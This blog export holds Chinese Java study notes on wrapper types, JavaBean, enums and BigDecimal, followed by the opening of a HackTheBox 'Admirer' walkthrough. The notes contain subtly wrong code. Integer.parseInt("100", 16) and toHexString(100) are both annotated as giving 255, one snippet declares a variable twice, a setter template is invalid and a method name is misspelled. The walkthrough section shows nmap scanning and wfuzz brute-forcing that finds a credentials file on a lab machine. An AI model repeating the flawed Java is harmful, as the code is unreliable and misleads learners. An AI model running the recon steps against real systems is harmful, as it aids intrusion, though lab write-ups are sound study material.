<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Integer n = <span class="number">100</span>;</span><br><span class="line"><span class="keyword">int</span> x = n;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>但是这样做可能会造成空指针异常的错误：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Integer n = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">int</span> i = n;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="不变性">不变性</h4>
<p>由于包装类型都属于引用类型，所以一旦创建了包装类型的对象，该对象就是不可变的。</p>
<p>和<code>String</code>类似，对于两个<code>Integer</code>实例进行比较必须使用<code>equals()</code>，而不能使用<code>==</code>。</p>
<h4 id="进制转换">进制转换</h4>
<p>最常用的静态方法<code>parseInt()</code>可以把字符串解析成一个整数：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> x1 = Integer.parseInt(<span class="string">&quot;100&quot;</span>); <span class="comment">// 100</span></span><br><span class="line"><span class="keyword">int</span> x2 = Integer.parseInt(<span class="string">&quot;100&quot;</span>, <span class="number">16</span>); <span class="comment">// 255</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><code>Integer</code>还可以把整数格式化为指定进制的字符串：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(Integer.toString(<span class="number">100</span>)); <span class="comment">// &quot;100&quot;</span></span><br><span class="line">        System.out.println(Integer.toString(<span class="number">100</span>, <span class="number">36</span>)); <span class="comment">// &quot;2s&quot;</span></span><br><span class="line">        System.out.println(Integer.toHexString(<span class="number">100</span>)); <span class="comment">// &quot;255&quot;</span></span><br><span class="line">        System.out.println(Integer.toOctalString(<span class="number">100</span>)); <span class="comment">// &quot;144&quot;</span></span><br><span class="line">        System.out.println(Integer.toBinaryString(<span class="number">100</span>)); <span class="comment">// &quot;1100100&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>所有的整数和浮点数的包装类型都继承自<code>Number</code>，因此，可以非常方便地直接通过包装类型获取各种基本类型：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//向上转型为Number</span></span><br><span class="line">Number num = <span class="keyword">new</span> Integer(<span class="number">100</span>);</span><br><span class="line"><span class="comment">// 获取byte, int, long, float, double;</span></span><br><span class="line"><span class="keyword">byte</span> b = num.byteValue();</span><br><span class="line"><span class="keyword">int</span> i = num.intValue();</span><br><span class="line"><span class="keyword">long</span> l = num.longValue();</span><br><span class="line"><span class="keyword">float</span> f = num.floatValue();</span><br><span class="line"><span class="keyword">double</span> d = num.doubleValue();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="无符号整型">无符号整型</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span> x = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">byte</span> x = <span class="number">127</span>;</span><br><span class="line">        System.out.println(Byte.toUnsignedInt(x)); <span class="comment">// 255</span></span><br><span class="line">        System.out.println(Byte.toUnsignedInt(x)); <span class="comment">// 127</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="JavaBean">JavaBean</h3>
<h4 id="定义">定义</h4>
<p>JavaBean是一种特殊但较为常见的<code>class</code>，它符合下列要求：</p>
<ul>
<li>
<p>有若干个<code>private</code>实例字段；</p>
</li>
<li>
<p>通过<code>public</code>方法来读写实例字段；</p>
</li>
<li>
<p>且读写方法符合如下命名规范：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//读方法</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Type <span class="title">getXyz</span><span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="comment">//写方法</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> Type <span class="title">setXyz</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="作用">作用</h4>
<p>JavaBean主要用来传递数据，即把一组数据组合成一个JavaBean便于传输</p>
<h4 id="枚举JavaBean属性">枚举JavaBean属性</h4>
<p>要枚举一个JavaBean的所有属性，可以直接使用Java核心库提供的<code>Introspector</code>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        BeanInfo info = Introspector.getBeanInfo(Person.class);</span><br><span class="line">        <span class="keyword">for</span> (PropertyDescriptor pd : info.getPropertyDescriptors()) &#123;</span><br><span class="line">            System.out.println(pd.getName());</span><br><span class="line">            System.out.println(<span class="string">&quot;  &quot;</span> + pd.getReadMethod());</span><br><span class="line">            System.out.println(<span class="string">&quot;  &quot;</span> + pd.getWriteMethod());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">age</span></span><br><span class="line"><span class="comment">  public int Person.getAge()</span></span><br><span class="line"><span class="comment">  public void Person.setAge(int)</span></span><br><span class="line"><span class="comment">class</span></span><br><span class="line"><span class="comment">  public final native java.lang.Class java.lang.Object.getClass()</span></span><br><span class="line"><span class="comment">  null</span></span><br><span class="line"><span class="comment">name</span></span><br><span class="line"><span class="comment">  public java.lang.String Person.getName()</span></span><br><span class="line"><span class="comment">  public void Person.setName(java.lang.String)</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="枚举类">枚举类</h3>
<p>直接上🌰：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Weekday day = Weekday.SUN;</span><br><span class="line">        <span class="keyword">if</span> (day == Weekday.SUN || day == Weekday.SAT) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Work at home&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Work an office!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">Weekday</span> </span>&#123;</span><br><span class="line">    SUN, MON, TUE, WED, THU, FRI, SAT;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>与<code>int</code>类型的常量相比，使用<code>enum</code>定义枚举的优势有：</p>
<ul>
<li><code>enum</code>常量本身带有类型信息，即<code>Weekday.SUN</code>的类型是<code>Weekday</code>；</li>
<li>不可能引用到非枚举的值；</li>
<li>不同类型的枚举不能相互比较或赋值。</li>
</ul>
<h4 id="enum的比较">enum的比较</h4>
<p><code>enum</code>是一个引用类型，前面提到引用类型进行比较必须使用<code>equal()</code>，因为<code>==</code>比较的是两个引用类型的变量是否是同一个对象。但<code>enum</code>类型可以例外，<strong>因为<code>enum</code>类型的每个常量在JVM中只有一个唯一实例</strong>。所以：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">day == Weekday.FRI <span class="comment">//true</span></span><br><span class="line">day.equals(Weekday.FRI) <span class="comment">//true</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="enum的方法">enum的方法</h4>
<h5 id="name">name()</h5>
<p>返回常量名，例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String s = Weekday.SUN.name() <span class="comment">// &quot;SUN&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="ordinal">ordinal()</h5>
<p>返回定义常量的顺序，例如</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> n = Weekday.SUN.ordinal() <span class="comment">// 0</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>但是需要注意的是，改变枚举常量定义的顺序就会导致<code>ordinal()</code>返回值发生变化。</p>
<p>如果枚举类型要和<code>int</code>转换，处于程序的健壮性考虑，就不能依靠<code>ordinal()</code>的返回值。因为<code>enum</code>本身就是一个类，所以我们可以每个枚举常量增加一个字段，并定义<code>private</code>的构造方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Weekday day = Weekday.SUN;</span><br><span class="line">        <span class="keyword">if</span> (day.dayValue == <span class="number">6</span> || day.dayValue == <span class="number">7</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Work at home!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Work at office!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">Weekday</span> </span>&#123;</span><br><span class="line">    MON(<span class="number">1</span>), TUE(<span class="number">2</span>), WED(<span class="number">3</span>), THU(<span class="number">4</span>), FRI(<span class="number">5</span>), SAT(<span class="number">6</span>), SUN(<span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">int</span> dayValue;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Weekday</span><span class="params">(<span class="keyword">int</span> dayValue)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.dayValue = dayValue;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="toString">toString()</h5>
<p>默认情况下，对枚举常量调用<code>toString()</code>会返回和<code>name()</code>一样的字符串。但是，<code>toString()</code>可以被覆写，而<code>name()</code>则不行。我们可以给<code>Weekday</code>添加<code>toString()</code>方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Weekday day = Weekday.SUN;</span><br><span class="line">        <span class="keyword">if</span> (day.dayValue == <span class="number">6</span> || day.dayValue == <span class="number">7</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Today is &quot;</span> + day + <span class="string">&quot;. Work at home!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Today is &quot;</span> + day + <span class="string">&quot;. Work at office!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">Weekday</span> </span>&#123;</span><br><span class="line">    MON(<span class="number">1</span>, <span class="string">&quot;星期一&quot;</span>), TUE(<span class="number">2</span>, <span class="string">&quot;星期二&quot;</span>), WED(<span class="number">3</span>, <span class="string">&quot;星期三&quot;</span>), THU(<span class="number">4</span>, <span class="string">&quot;星期四&quot;</span>), FRI(<span class="number">5</span>, <span class="string">&quot;星期五&quot;</span>), SAT(<span class="number">6</span>, <span class="string">&quot;星期六&quot;</span>), SUN(<span class="number">0</span>, <span class="string">&quot;星期日&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">int</span> dayValue;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> String chinese;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Weekday</span><span class="params">(<span class="keyword">int</span> dayValue, String chinese)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.dayValue = dayValue;</span><br><span class="line">        <span class="keyword">this</span>.chinese = chinese;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.chinese;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="Switch">Switch</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Weekday day = Weekday.SUN;</span><br><span class="line">        <span class="keyword">switch</span>(day) &#123;</span><br><span class="line">        <span class="keyword">case</span> MON:</span><br><span class="line">        <span class="keyword">case</span> TUE:</span><br><span class="line">        <span class="keyword">case</span> WED:</span><br><span class="line">        <span class="keyword">case</span> THU:</span><br><span class="line">        <span class="keyword">case</span> FRI:</span><br><span class="line">            System.out.println(<span class="string">&quot;Today is &quot;</span> + day + <span class="string">&quot;. Work at office!&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> SAT:</span><br><span class="line">        <span class="keyword">case</span> SUN:</span><br><span class="line">            System.out.println(<span class="string">&quot;Today is &quot;</span> + day + <span class="string">&quot;. Work at home!&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">&quot;cannot process &quot;</span> + day);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">Weekday</span> </span>&#123;</span><br><span class="line">    MON, TUE, WED, THU, FRI, SAT, SUN;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="BigInteger">BigInteger</h3>
<h3 id="BigDecimal">BigDecimal</h3>
<h4 id="定义-v2">定义</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">BigDecimal bd = <span class="keyword">new</span> BigDecimal(<span class="string">&quot;123.4567&quot;</span>);</span><br><span class="line">System.out.println(bd.mutiply(bd)); <span class="comment">// 15241.55677489</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="获取小数位数">获取小数位数</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">BigDecimal d1 = <span class="keyword">new</span> BigDecimal(<span class="string">&quot;123.45&quot;</span>);</span><br><span class="line">BigDecimal d2 = <span class="keyword">new</span> BigDecimal(<span class="string">&quot;123.4500&quot;</span>);</span><br><span class="line">BigDecimal d3 = <span class="keyword">new</span> BigDecimal(<span class="string">&quot;1234500&quot;</span>);</span><br><span class="line">System.out.println(d1.scale()); <span class="comment">// 2,两位小数</span></span><br><span class="line">System.out.println(d2.scale()); <span class="comment">// 4</span></span><br><span class="line">System.out.println(d3.scale()); <span class="comment">// 0</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="剔除小数末尾0">剔除小数末尾0</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">BigDecimal d1 = <span class="keyword">new</span> BigDecimal(<span class="string">&quot;123.4500&quot;</span>);</span><br><span class="line">BigDecimal d2 = d1.stripTrailingZeros();</span><br><span class="line">System.out.println(d1.scale()); <span class="comment">// 4</span></span><br><span class="line">System.out.println(d2.scale()); <span class="comment">// 2,因为去掉了00</span></span><br><span class="line"></span><br><span class="line">BigDecimal d3 = <span class="keyword">new</span> BigDecimal(<span class="string">&quot;1234500&quot;</span>);</span><br><span class="line">BigDecimal d4 = d3.stripTrailingZeros();</span><br><span class="line">System.out.println(d3.scale()); <span class="comment">// 0</span></span><br><span class="line">System.out.println(d4.scale()); <span class="comment">// -2,表示这是一个整数，并且末尾有两个0</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="设置精度">设置精度</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.math.BigDecimal;</span><br><span class="line"><span class="keyword">import</span> java.math.RoundingMode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        BigDecimal d1 = <span class="keyword">new</span> BigDecimal(<span class="string">&quot;123.456789&quot;</span>);</span><br><span class="line">        BigDecimal d2 = d1.setScale(<span class="number">4</span>, RoundingMode.HALF_UP); <span class="comment">// 123.4568 四舍五入保留4位小数</span></span><br><span class="line">        BigDecimal d3 = d1.setScale(<span class="number">4</span>, RoundingMode.DOWN); <span class="comment">//123.4567 直接截断</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="除法运算">除法运算</h4>
<p>对<code>BigDecimal</code>做加、减、乘时，精度不会丢失，但是做除法时，存在无法除尽的情况，这时，就必须指定精度以及如何进行截断：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">BigDecimal d1 = <span class="keyword">new</span> BigDecimal(<span class="string">&quot;123.456&quot;</span>);</span><br><span class="line">BigDecimal d2 = <span class="keyword">new</span> BigDecimal(<span class="string">&quot;23.456789&quot;</span>);</span><br><span class="line">BigDecimal d3 = d1.divide(d2, <span class="number">10</span>, RoundingMode.HALF_UP); <span class="comment">//保留10位小数并四舍五入 </span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="比较">比较</h4>
<p>在比较两个<code>BigDecimal</code>的值是否相等时，要特别注意，使用<code>equals()</code>方法不但要求两个<code>BigDecimal</code>的值相等，还要求它们的<code>scale()</code>相等：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">BigDecimal d1 = <span class="keyword">new</span> BigDecimal(<span class="string">&quot;123.456&quot;</span>);</span><br><span class="line">BigDecimal d2 = <span class="keyword">new</span> BigDecimal(<span class="string">&quot;123.45600&quot;</span>);</span><br><span class="line">d1.equals(d2); <span class="comment">// False</span></span><br><span class="line">d1.equals(d2.stripTrailingZeros()); <span class="comment">// True</span></span><br><span class="line">d1.compareTo(d2); <span class="comment">//0 根据两个值的大小分别返回负数、正数和0，分别表示小于、大于和等于。</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>总是使用compareTo()比较两个BigDecimal的值，不要使用equals()！</strong></p>
<h3 id="常用工具类">常用工具类</h3>
<ul>
<li>
<p>Math：数学计算</p>
</li>
<li>
<p>Random：生成伪随机数</p>
<p>要生成一个随机数，可以使用<code>nextInt()</code>、<code>nextLong()</code>、<code>nextFloat()</code>、<code>nextDouble()</code>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Random r = <span class="keyword">new</span> Random();</span><br><span class="line">r.nextInt(); <span class="comment">// 2071575453,每次都不一样</span></span><br><span class="line">r.nextInt(<span class="number">10</span>); <span class="comment">// 5,生成一个[0,10)之间的int</span></span><br><span class="line">r.nextLong(); <span class="comment">// 8811649292570369305,每次都不一样</span></span><br><span class="line">r.nextFloat(); <span class="comment">// 0.54335...生成一个[0,1)之间的float</span></span><br><span class="line">r.nextDouble(); <span class="comment">// 0.3716...生成一个[0,1)之间的double</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>如果我们在创建<code>Random</code>实例时指定一个种子，就会得到完全确定的随机数序列：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Random r = <span class="keyword">new</span> Random(<span class="number">12345</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">            System.out.println(r.nextInt(<span class="number">100</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>SecureRandom：生成安全的随机数</p>
</li>
</ul>
]]></content>
      <categories>
        <category>编程</category>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB::Admirer-walkthrough</title>
    <url>/Target_drone/HackTheBox/18.HTB-Admirer-walkthrough/</url>
    <content><![CDATA[<h1 id="HTB-Admirer-Walkthrough">HTB::Admirer Walkthrough</h1>
<blockquote>
<p>文章首发于 星盟安全 公众号</p>
</blockquote>
<h2 id="0x01-Info-Card">0x01 Info Card</h2>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200520114625.png" style="zoom: 80%;" />
<h2 id="0x02-Tool-and-Tips">0x02 Tool and Tips</h2>
<ul>
<li>nmap</li>
<li>wfuzz</li>
<li>adminer exploit</li>
<li>python libaray path hijack</li>
</ul>
<h2 id="0x03-Pentesting">0x03 Pentesting</h2>
<h3 id="Inital-Enumeration">Inital Enumeration</h3>
<p>端口扫描</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ nmap -Pn -A -T4 -p- 10.10.10.187</span><br><span class="line">Starting Nmap 7.70 ( https:&#x2F;&#x2F;nmap.org ) at 2020-05-19 21:49 CEST</span><br><span class="line">Nmap scan report for 10.10.10.187</span><br><span class="line">Host is up (0.014s latency).</span><br><span class="line">Not shown: 65532 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21&#x2F;tcp open  ftp     vsftpd 3.0.3</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA)</span><br><span class="line">|   256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA)</span><br><span class="line">|_  256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.25 ((Debian))</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_&#x2F;admin-dir</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.25 (Debian)</span><br><span class="line">|_http-title: Admirer</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 26.67 seconds</span><br></pre></td></tr></table></figure>
<p>FTP不允许匿名登录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">➜  admirer ftp admirer.htb </span><br><span class="line">Connected to admirer.htb.</span><br><span class="line">220 (vsFTPd 3.0.3)</span><br><span class="line">Name (admirer.htb:prashant): anonymous</span><br><span class="line">530 Permission denied.</span><br><span class="line">Login failed.</span><br><span class="line">ftp&gt; </span><br></pre></td></tr></table></figure>
<p>访问<code>10.10.10.187/admin-dir</code>返回403 Forbidden，用wfuzz工具扫描目录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ wfuzz -c -w &#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Discovery&#x2F;Web-Content&#x2F;big.txt -z list,txt-php-html -u http:&#x2F;&#x2F;10.10.10.187&#x2F;admin-dir&#x2F;FUZZ.FUZ2Z --hc 404,403 -t 100</span><br><span class="line"></span><br><span class="line">Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#39;s documentation for more information.</span><br><span class="line"></span><br><span class="line">********************************************************</span><br><span class="line">* Wfuzz 2.4.5 - The Web Fuzzer                         *</span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">Target: http:&#x2F;&#x2F;10.10.10.187&#x2F;admin-dir&#x2F;FUZZ.FUZ2Z</span><br><span class="line">Total requests: 61419</span><br><span class="line"></span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">ID           Response   Lines    Word     Chars       Payload</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">000015592:   200        29 L     39 W     350 Ch      &quot;contacts - txt&quot;</span><br><span class="line">000016327:   200        11 L     13 W     136 Ch      &quot;credentials - txt&quot;</span><br><span class="line"></span><br><span class="line">Total time: 247.8061</span><br><span class="line">Processed Requests: 61419</span><br><span class="line">Filtered Requests: 61417</span><br><span class="line">Requests&#x2F;sec.: 247.8509</span><br></pre></td></tr></table></figure>
<p>contact.txt</p>
